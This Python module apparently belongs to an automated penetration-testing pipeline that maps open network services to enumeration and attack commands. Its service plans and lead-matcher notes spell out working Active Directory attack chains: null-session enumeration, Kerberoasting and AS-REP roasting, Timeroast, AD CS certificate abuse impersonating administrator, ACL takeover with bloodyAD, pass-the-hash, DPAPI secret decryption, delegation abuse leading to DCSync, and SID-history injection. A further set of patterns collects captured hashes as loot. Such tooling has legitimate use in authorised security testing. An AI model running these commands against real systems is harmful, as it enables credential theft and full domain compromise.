"""Service -> enumeration routing for the network pipeline.

The efficiency win: only run the tool that fits an open service. A box with no
445 never gets SMB tools; an LDAP port triggers anon-bind checks; Kerberos
triggers user-enum / AS-REP. Each plan is unauthenticated by default (foothold
phase); cred-gated steps run only when creds are supplied.

A plan step: {tool, args, why, creds}. Templates interpolate {ip} {domain}
{user} {password} {creds} {userlist}. Two optional keys chain steps within a
host: "captures": (name, regex) stores a match from this step's output; "needs":
name skips the step until an earlier step on the same host captured that value
(e.g. SNMP community from onesixtyone -> snmp-check {ip} -c {community}). Missing
tools are skipped by the pipeline (it checks availability), so a partial toolset
still runs.

Lead matchers turn raw output into candidate findings — the things worth an
operator's attention (anon access, roastable hashes, signing disabled).
"""

from __future__ import annotations

import re

# Discovered-value extractors used by chained steps (see the "captures" key).
# onesixtyone prints `<ip> [<community>] <sysDescr>` on a hit.
_SNMP_COMMUNITY_RX = re.compile(r"\[([^\]]+)\]")

# Default username list for SMTP VRFY enum ({userlist} in a plan). SecLists
# shortlist; pre-seed the file or edit the step to point elsewhere.
DEFAULT_USERLIST = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

# service-name substrings / ports -> list of plan steps.
# Keys are matched against BOTH the nmap service name and str(port).
SERVICE_PLANS: dict[str, list[dict]] = {
    "smb": [
        {"tool": "enum4linux-ng", "args": "-A {ip}", "why": "full SMB/RPC enum", "creds": False},
        {"tool": "nxc", "args": "smb {ip} -u '' -p '' --shares", "why": "null-session shares", "creds": False},
        {"tool": "nxc", "args": "smb {ip} -M timeroast", "why": "Timeroast computer-account hashes (offline crackable; catches manually-set/weak machine passwords)", "creds": False},
        {"tool": "nxc", "args": "smb {ip} -u {user} -p {password} --shares", "why": "auth shares", "creds": True},
    ],
    "microsoft-ds": [
        {"tool": "nxc", "args": "smb {ip} -u '' -p '' --shares", "why": "null-session shares", "creds": False},
    ],
    "netbios-ssn": [
        {"tool": "nxc", "args": "smb {ip} -u '' -p ''", "why": "SMB signing / null session", "creds": False},
    ],
    "ldap": [
        {"tool": "nxc", "args": "ldap {ip} -u '' -p ''", "why": "anon LDAP bind / domain info", "creds": False},
        {"tool": "nxc", "args": "ldap {ip} -u {user} -p {password} --gmsa", "why": "gMSA managed-password read (if group grants ReadGMSAPassword)", "creds": True},
        {"tool": "certipy", "args": "find -u {user} -p {password} -dc-ip {ip} -vulnerable -stdout", "why": "AD-CS ESC scan (ESC1-16)", "creds": True},
    ],
    "kerberos": [
        {"tool": "nxc", "args": "smb {ip} -u '' -p '' --users", "why": "domain user list (for roasting)", "creds": False},
        {"tool": "getuserspns.py", "args": "-dc-ip {ip} {domain}/{user}:{password} -request", "why": "Kerberoast SPN accounts (roastable TGS hashes)", "creds": True},
        {"tool": "getnpusers.py", "args": "-dc-ip {ip} {domain}/{user}:{password} -request", "why": "AS-REP roast (authenticated enum of no-preauth accounts)", "creds": True},
    ],
    "msrpc": [
        {"tool": "rpcclient", "args": "-U '' -N {ip} -c enumdomusers", "why": "null RPC user enum", "creds": False},
    ],
    "mssql": [
        {"tool": "nxc", "args": "mssql {ip} -u '' -p ''", "why": "MSSQL null / weak auth", "creds": False},
        {"tool": "nxc", "args": "mssql {ip} -u {user} -p {password} -M mssql_priv", "why": "MSSQL priv/impersonation + xp_cmdshell check", "creds": True},
        {"tool": "nxc", "args": "mssql {ip} -u {user} -p {password} -M enum_links", "why": "MSSQL linked-server enum (lateral-movement links)", "creds": True},
    ],
    "snmp": [
        {"tool": "onesixtyone", "args": "{ip} public", "why": "SNMP public community", "creds": False,
         "captures": ("community", _SNMP_COMMUNITY_RX)},
        {"tool": "snmp-check", "args": "{ip} -c {community}", "why": "SNMP MIB walk with the discovered community", "creds": False,
         "needs": "community"},
    ],
    "161": [
        {"tool": "onesixtyone", "args": "{ip} public", "why": "SNMP public community", "creds": False,
         "captures": ("community", _SNMP_COMMUNITY_RX)},
        {"tool": "snmp-check", "args": "{ip} -c {community}", "why": "SNMP MIB walk with the discovered community", "creds": False,
         "needs": "community"},
    ],
    "nfs": [
        {"tool": "showmount", "args": "-e {ip}", "why": "NFS export list (world-readable / no_root_squash mounts)", "creds": False},
    ],
    "rpcbind": [
        {"tool": "showmount", "args": "-e {ip}", "why": "NFS export list via portmapper", "creds": False},
    ],
    "111": [
        {"tool": "showmount", "args": "-e {ip}", "why": "NFS export list via portmapper", "creds": False},
    ],
    "2049": [
        {"tool": "showmount", "args": "-e {ip}", "why": "NFS export list", "creds": False},
    ],
    "smtp": [
        {"tool": "smtp-user-enum", "args": "-M VRFY -U {userlist} -t {ip}", "why": "SMTP VRFY user enumeration", "creds": False},
    ],
    "25": [
        {"tool": "smtp-user-enum", "args": "-M VRFY -U {userlist} -t {ip}", "why": "SMTP VRFY user enumeration", "creds": False},
    ],
    "winrm": [
        {"tool": "nxc", "args": "winrm {ip} -u {user} -p {password}", "why": "WinRM exec check", "creds": True},
    ],
    "5985": [
        {"tool": "nxc", "args": "winrm {ip} -u {user} -p {password}", "why": "WinRM exec check", "creds": True},
    ],
}

# Ports that are web servers -> handled by the web-lane bridge, not here.
_WEB_HINTS = {"http", "https", "http-alt", "http-proxy"}

# Lead matchers: (regex, lead_type, note). Applied to each step's output.
LEAD_MATCHERS: list[tuple[re.Pattern, str, str]] = [
    (re.compile(r"\$krb5asrep\$", re.I), "asrep_hash", "AS-REP roastable — crack offline (hashcat -m 18200)"),
    (re.compile(r"\$krb5tgs\$", re.I), "kerberoast_hash", "Kerberoastable SPN — crack offline (hashcat -m 13100)"),
    (re.compile(r"signing:\s*False", re.I), "smb_signing_off", "SMB signing disabled — relay candidate (ntlmrelayx)"),
    (re.compile(r"\[\+\].*\\\w+:\s", re.I), "valid_cred", "valid credential accepted"),
    (re.compile(r"(anonymous login successful|allow guest|guest access)", re.I), "anon_access", "anonymous / guest access"),
    (re.compile(r"\bREADONLY|READ, WRITE|READ ONLY\b", re.I), "readable_share", "readable share — enumerate contents"),
    (re.compile(r"Pwn3d!|\(Pwn3d!\)", re.I), "admin_access", "admin/exec access (Pwn3d!) — dump creds"),
    (re.compile(r"vulnerable to (ms\d\d-\d+|zerologon|petitpotam)", re.I), "known_cve", "host reports a named critical CVE"),
    (re.compile(r"\[!\]\s*Vulnerabilities|\bESC(?:1[0-6]|[1-9])\b", re.I), "adcs_esc",
     "AD CS template vulnerable (ESC1-16) — certipy req -ca <CA> -template <t> -upn administrator@<dom> -sid <...-500>, then certipy auth -pfx administrator.pfx"),
    (re.compile(r"\b(?:ForceChangePassword|GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights|AddKeyCredentialLink|AddSelf|AddMember|AddAllowedToAct|WriteAccountRestrictions|WriteSPN|ReadGMSAPassword|Owns)\b", re.I), "dangerous_acl",
     "dangerous ACL edge over a principal — take it over with bloodyAD (add groupMember / set owner+genericAll / set password / set rbcd) or net rpc password / pywhisker / targetedKerberoast (WriteSPN). Feed BloodHound to confirm the full path"),
    (re.compile(r"msDS-ManagedPassword|ReadGMSAPassword|gMSADumper", re.I), "gmsa_readable",
     "gMSA managed password readable — dump it (bloodyAD get object '<gmsa$>' --attr msDS-ManagedPassword / gMSADumper.py / nxc ldap --gmsa) for a service-account NT hash, then authenticate with -H"),
    (re.compile(r"\$sntp-ms\$", re.I), "timeroast_hash",
     "Timeroastable computer account — crack offline (hashcat -m 31300). Manually-set/weak machine passwords fall; resolve the RID to the account via BloodHound"),
    (re.compile(r"^[^\s:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}:::", re.I | re.M), "dumped_hashes",
     "NT hashes dumped (pwdump/secretsdump) — reuse via Pass-the-Hash (nxc <proto> -u <user> -H <nt>, psexec.py -hashes :<nt>)"),
    (re.compile(r"\[\*\]\s*_?SC_GMSA_|Decrypting DPAPI|MasterKey|CREDENTIAL_BLOB|DPAPI_SYSTEM", re.I), "dpapi_secret",
     "DPAPI material recovered — impacket-dpapi masterkey -file <mk> -sid <sid> -password/-pvk, then impacket-dpapi credential -file <blob> -key <decrypted>"),
    (re.compile(r"TRUSTED_FOR_DELEGATION|unconstrained delegation", re.I), "unconstrained_deleg",
     "unconstrained-delegation host — coerce a DC (PetitPotam/printerbug/MSSQL xp_dirtree) -> capture its TGT (Rubeus monitor / krbrelayx) -> DCSync"),
    (re.compile(r"msDS-AllowedToDelegateTo|constrained delegation|AllowedToActOnBehalf", re.I), "constrained_deleg",
     "constrained/RBCD delegation — S4U2Self+S4U2Proxy impersonation (getST.py -impersonate administrator -altservice cifs)"),
    (re.compile(r"Linked Server|sp_linkedservers|\bisremote\b|enum_links", re.I), "mssql_link",
     "MSSQL linked server — lateral RPC to the remote instance (mssqlclient: EXECUTE AS / EXEC AT <link> / openquery), often lands as the SQL service account on another host"),
    (re.compile(r"xp_cmdshell|\bis[_ ]?sysadmin\b|\bIMPERSONATE\b", re.I), "mssql_priv",
     "MSSQL exec/impersonation path — enable xp_cmdshell or EXECUTE AS LOGIN to run OS commands as the service account"),
    (re.compile(r"CrossForestTrust|Bidirectional|ParentChild|domain_trust", re.I), "domain_trust",
     "domain/forest trust — cross-forest Kerberos ticket reuse; if SID filtering is off, extra-SID injection (raiseChild.py / ticketer.py -extra-sid). nltest /domain_trust to confirm"),
]

# Loot patterns worth auto-capturing to the loot store with chain-of-custody.
LOOT_MATCHERS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\$krb5asrep\$[^\s]+"), "asrep_hash"),
    (re.compile(r"\$krb5tgs\$[^\s]+"), "kerberoast_hash"),
    (re.compile(r"\d+:\$sntp-ms\$[^\s]+"), "timeroast_hash"),
    (re.compile(r"[0-9a-f]{32}:[0-9a-f]{32}", re.I), "ntlm_hash"),
]


def plans_for(service: str, port: int, have_creds: bool) -> list[dict]:
    """Return enum steps for a service/port, filtered by creds availability."""
    svc = (service or "").lower()
    steps: list[dict] = []
    seen = set()
    for key, plan in SERVICE_PLANS.items():
        if key in svc or key == str(port):
            for step in plan:
                if step["creds"] and not have_creds:
                    continue
                sig = (step["tool"], step["args"])
                if sig in seen:
                    continue
                seen.add(sig)
                steps.append(step)
    return steps


def is_web(service: str, port: int) -> bool:
    svc = (service or "").lower()
    return svc in _WEB_HINTS or svc.startswith("http") or port in {80, 443, 8080, 8443, 8000}


def extract_leads(output: str) -> list[dict]:
    leads = []
    for rx, ltype, note in LEAD_MATCHERS:
        if rx.search(output or ""):
            leads.append({"type": ltype, "note": note})
    return leads


def extract_loot(output: str) -> list[tuple[str, str]]:
    """Return [(loot_type, value)] found in output (deduped)."""
    found = []
    seen = set()
    for rx, ltype in LOOT_MATCHERS:
        for m in rx.findall(output or ""):
            if m not in seen:
                seen.add(m)
                found.append((ltype, m))
    return found
